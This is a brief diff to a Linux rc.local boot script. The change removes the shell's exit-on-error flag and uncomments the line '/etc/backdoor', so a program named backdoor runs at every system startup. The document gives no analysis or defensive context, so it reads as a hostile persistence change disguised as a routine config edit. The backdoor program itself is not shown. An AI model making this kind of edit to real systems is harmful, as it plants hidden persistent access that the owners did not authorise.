@@ -1,4 +1,4 @@
-#!/bin/sh -e
+#!/bin/sh
 #
 # rc.local
 #
@@ -10,6 +10,6 @@
 # bits.
 #
 # By default this script does nothing.
-#/etc/backdoor
+/etc/backdoor
 
 exit 0
